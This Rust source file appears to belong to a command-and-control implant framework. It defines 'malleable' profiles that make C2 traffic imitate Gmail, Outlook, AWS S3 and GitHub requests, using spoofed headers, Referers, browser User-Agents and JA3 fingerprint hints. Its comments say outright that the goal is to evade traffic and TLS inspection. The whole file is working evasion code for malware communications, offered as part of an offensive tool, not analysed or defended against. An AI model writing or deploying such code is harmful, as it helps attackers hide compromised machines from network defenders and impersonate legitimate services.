// transport/profile.rs
// 🛡️ Phase 3: Malleable C2 Profile
//
// Provides customizable HTTP request templates that make C2 traffic look like
// normal application traffic. Each profile defines headers, URI patterns,
// and body formats that can be swapped at build time.

use std::collections::HashMap;

/// A malleable profile defines how C2 traffic should look on the wire.
#[derive(Clone, Debug)]
pub struct MalleableProfile {
    /// Profile name (e.g. "gmail", "outlook", "aws-s3")
    pub name: &'static str,
    /// HTTP method for requests
    pub method: &'static str,
    /// URI template with placeholders
    pub uri_template: &'static str,
    /// Static headers to add
    pub headers: &'static [(&'static str, &'static str)],
    /// User-Agent string
    pub user_agent: &'static str,
    /// JA3 fingerprint hint (browser to mimic)
    pub ja3_hint: &'static str,
}

// Pre-defined profiles mimicking common legitimate services.
// These are selected at build time via the `C2_PROFILE` env var or config.

pub const PROFILE_GMAIL: MalleableProfile = MalleableProfile {
    name: "gmail",
    method: "POST",
    uri_template: "/mail/u/0/?sync={session_id}&ati={jitter}",
    headers: &[
        ("Accept", "application/json, text/plain, */*"),
        ("Accept-Language", "en-US,en;q=0.9"),
        ("X-Gmail-Travel", "true"),
        ("Referer", "https://mail.google.com/mail/u/0/"),
    ],
    user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    ja3_hint: "chrome-126",
};

pub const PROFILE_OUTLOOK: MalleableProfile = MalleableProfile {
    name: "outlook",
    method: "POST",
    uri_template: "/owa/sessiondata.ashx?ac=1&appcacheclient=0&crr=1&crs=1&wt-id={session_id}",
    headers: &[
        ("Accept", "application/json"),
        ("Accept-Language", "en-US"),
        ("X-OWA-Version", "16.0.17714.2"),
        ("Referer", "https://outlook.live.com/owa/"),
    ],
    user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0",
    ja3_hint: "edge-126",
};

pub const PROFILE_AWS: MalleableProfile = MalleableProfile {
    name: "aws-s3",
    method: "PUT",
    uri_template: "/{bucket}/{key}?x-id=PutObject",
    headers: &[
        ("Accept", "*/*"),
        ("Accept-Language", "en-US"),
        ("X-Amz-Content-SHA256", "UNSIGNED-PAYLOAD"),
        ("X-Amz-Date", "{timestamp}"),
    ],
    user_agent: "aws-sdk-cpp/1.11.0",
    ja3_hint: "aws-sdk",
};

pub const PROFILE_GITHUB: MalleableProfile = MalleableProfile {
    name: "github",
    method: "POST",
    uri_template: "/api/graphql",
    headers: &[
        ("Accept", "application/vnd.github+json"),
        ("Accept-Language", "en-US"),
        ("X-GitHub-Api-Version", "2022-11-28"),
        ("Referer", "https://github.com/"),
    ],
    user_agent: "GitHub-Hookshot/600079ad",
    ja3_hint: "github-webhook",
};

/// Default profile — still inject a realistic browser UA (not empty).
pub const PROFILE_DEFAULT: MalleableProfile = MalleableProfile {
    name: "default",
    method: "POST",
    uri_template: "/ws",
    headers: &[
        ("Accept", "*/*"),
        ("Accept-Language", "en-US,en;q=0.9"),
    ],
    user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    ja3_hint: "chrome-126",
};

/// Get profile by name. Returns default if not found.
pub fn get_profile(name: &str) -> MalleableProfile {
    match name {
        "gmail" => PROFILE_GMAIL,
        "outlook" => PROFILE_OUTLOOK,
        "aws" | "s3" | "aws-s3" => PROFILE_AWS,
        "github" => PROFILE_GITHUB,
        _ => PROFILE_DEFAULT,
    }
}

/// Apply a profile to a WebSocket request builder.
/// Adds headers and sets user-agent to match the profile.
#[cfg(feature = "ws")]
pub fn apply_profile_headers(
    profile: &MalleableProfile,
    builder: &mut tokio_tungstenite::tungstenite::http::Request<()>,
) {
    use tokio_tungstenite::tungstenite::http::header;
    if !profile.user_agent.is_empty() {
        if let Ok(ua) = profile.user_agent.parse() {
            builder.headers_mut().insert(header::USER_AGENT, ua);
        }
    }
    for (k, v) in profile.headers.iter() {
        if let Ok(name) = header::HeaderName::from_bytes(k.as_bytes()) {
            if let Ok(value) = v.parse() {
                builder.headers_mut().insert(name, value);
            }
        }
    }
}

/// Generate a JA3-like fingerprint for TLS ClientHello inspection evasion.
/// This is a simplified hint; full JA3 randomization requires TLS stack control.
/// For wss:// connections, we add randomized cipher list ordering in the
/// connector setup (see ws.rs).
pub fn get_ja3_hint(profile: &MalleableProfile) -> &'static str {
    profile.ja3_hint
}
